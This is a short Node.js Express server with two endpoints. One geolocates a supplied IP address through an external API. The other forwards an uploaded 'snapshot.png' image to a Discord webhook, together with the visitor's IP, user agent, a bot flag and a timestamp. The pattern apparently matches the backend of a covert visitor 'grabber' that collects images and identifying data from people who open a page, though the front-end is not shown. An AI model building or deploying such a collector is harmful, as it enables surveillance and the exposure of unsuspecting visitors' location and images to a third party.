import express from "express";
import fetch from "node-fetch";
import multer from "multer";

const app = express();
const upload = multer();
const PORT = 3000;

/* PUT YOUR KEYS HERE */
const GEO_API_KEY = "YOUR_ABSTRACT_API_KEY";
const DISCORD_WEBHOOK =
  "https://discord.com/api/webhooks/XXXX/YYYY";

/* serve static files */
app.use(express.static("."));

/* geo endpoint */
app.get("/geo", async (req,res)=>{
  const ip=req.query.ip;
  const r=await fetch(
    `https://ipgeolocation.abstractapi.com/v1/?api_key=${GEO_API_KEY}&ip_address=${ip}`
  );
  const j=await r.json();
  res.json({
    country:j.country,
    city:j.city,
    region:j.region,
    timezone:j.timezone?.name
  });
});

/* webhook proxy */
app.post("/send", upload.single("file"), async (req,res)=>{
  const form = new FormData();
  form.append("file", req.file.buffer, "snapshot.png");

  const meta = JSON.parse(req.body.meta);
  form.append("content",
    `Snapshot\nIP: ${meta.ip}\nBot: ${meta.bot}\nUA: ${meta.ua}\nTime: ${meta.time}`
  );

  await fetch(DISCORD_WEBHOOK,{method:"POST",body:form});
  res.send("ok");
});

app.listen(PORT,()=>console.log(`running http://localhost:${PORT}`));
